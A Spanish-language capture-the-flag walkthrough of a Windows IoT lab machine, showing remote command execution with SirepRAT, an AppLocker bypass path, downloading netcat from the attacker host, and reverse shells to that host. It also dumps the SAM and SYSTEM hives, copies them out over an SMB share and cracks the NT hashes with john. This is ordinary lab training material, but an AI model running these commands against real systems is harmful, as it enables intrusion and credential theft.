## Vuln exploit & Gaining Access {-}

### Ganando accesso con SirepRAT {-}

1. Descargamos nc64

    ```bash
    wget https://github.com/vinsworldcom/NetCat64/releases/download/1.11.6.4/nc64.exe
    ```

1. Creamos un servidor web con python

    ```bash
    python3 -m http.server 80
    ```

1. Intentamos descargar el binario desde la maquina victima

    ```bash
    python SirepRAT.py 10.10.10.204 LaunchCommandWithOutput --return_output --cmd "C:\Windows\System32\cmd.exe" --args " /c certutil.exe -f -urlcache -split http://10.10.14.8/nc64.exe C:\Windows\Temp\nc64.exe" --v
    ```

Aqui vemos que no a pasado nada y que no hemos recibido ningun GET a nuestro servidor python.

Miramos si funcciona usando un directorio [applocker](https://github.com/api0cradle/UltimateAppLockerByPassList/blob/master/Generic-AppLockerbypasses.md)

```bash
python SirepRAT.py 10.10.10.204 LaunchCommandWithOutput --return_output --cmd "C:\Windows\System32\cmd.exe" --args " /c certutil.exe -f -urlcache -split http://10.10.14.8/nc64.exe C:\Windows\System32\spool\drivers\color\nc64.exe" --v
```

No funcciona. Intentamos con Powershell

```bash
python SirepRAT.py 10.10.10.204 LaunchCommandWithOutput --return_output --cmd "powershell" --args " /c iwr -uri http://10.10.14.8/nc64.exe -OutFile C:\Windows\System32\spool\drivers\color\nc64.exe" --v
```

Ahora si. Intentamos entablarnos una reverseshell.

1. Nos ponemos en escucha por el puerto 443

    ```bash
    rlwrap nc -nlvp 443
    ```

1. Lanzamos la shell

    ```bash
    python SirepRAT.py 10.10.10.204 LaunchCommandWithOutput --return_output --cmd "C:\Windows\System32\cmd.exe" --args " /c C:\Windows\System32\spool\drivers\color\nc64.exe -e cmd 10.10.14.8 443" --v
    ```

Ya estamos a dentre de la maquina victima.

```bash
whoami
#Output
'whoami' is not recognized as an internal or external command.

echo %USERNAME%
#Output
Omni
```

Como no hay directorio de usuarios en la maquina buscamos recursivamente por un fichero llamado `user.txt`

```bash
dir /r /s user.txt
cd C:\Data\Users\app
type user.txt
```

Aqui vemos quel fichero esta de typo `System.Management.Automation.PSCredential` que significa que esta cifrado. Intentamos leerlo con
el comando `(Import-CliXml -Path user.txt)` pero no nos deja. Miramos los derechos de este fichero con `icacls user.txt` y vemos quel usuario
app tiene los derechos full para este fichero. Esto significa que nos tenemos que convertir en el usuario **app**. 


### User Pivoting {-}


Lo raro aqui es que si hacemos 
un `net user`, no vemos que existe el usuario **omni** y esto es turbio porque tambien podria decir que somos un usuario privilegiado.

Si creamos una carpeta en `C:\Data\Users` vemos que podemos crearla sin problema. Intentamos ver si podemos recuperar cosas como **sam**.

```bash
cd C:\Data\Users
mkdir Temp
cd Temp
reg save HKLM\system system.backup
reg save HKLM\sam sam.backup
```

Nos transferimos los ficheros creando un recurso compartido a nivel de red.

```bash
impacket-smbserver smbFolder $(pwd) -smb2support -username s4vitar -password s4vitar123
```

Desde la maquina victima, nos creamos una unidad logica, la qual se conecta a nuestro recurso compartido

```bash
net use x: \\10.10.14.8\smbFolder /user:s4vitar s4vitar123
dir x:\
dir C:\Temp
copy sam.backup x:\sam
copy system.backup x:\system
```

#### Crackeando los hashes NT con John {-}

Ahora intentamos dumpear los hashes de los usuarios con **secretsdump**.

```bash
secretsdump.py -sam sam -system system LOCAL
```

Hemos podido obtener los hashes NT de los usuarios del systema. Los copiamos y los metemos en un fichero llamado hashes.

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hashes --format=NT
```

Aqui hemos podido crackear el hash del usuario **app**

#### Creando una reverseshell desde Windows Device Portal {-}

Nos connectamos al portal de la web a la url `http://10.10.10.204:8080`. Aqui buscamos manera de ejecutar comandos como en Cualquier gestor
de contenido o panel de administracion. Y encontramos en el menu Processes un link llamado **Run command**.

Probamos con `echo %USERNAME%` y ejecuta el comando como el usuario app. Creamos un reverseshell.

1. Nos ponemos en escuchar por el puerto 443

    ```bash
    rlwrap nc -nlvp 443
    ```

1. Lanzamos el ncat previamente uploadeado en el systema

    ```bash
    C:\Windows\System32\spool\drivers\color\nc64.exe -e cmd 10.10.14.8 443
    ```

Ya somos el usuario app y intentamos ejecutar la operacion cryptografica para leer la flag.

```bash
cd C:\Data\app
powershell
(Import-CliXml -Path user.txt)
(Import-CliXml -Path user.txt).GetNetworkCredential()
(Import-CliXml -Path user.txt).GetNetworkCredential().password
```

Ya tenemos la flag.

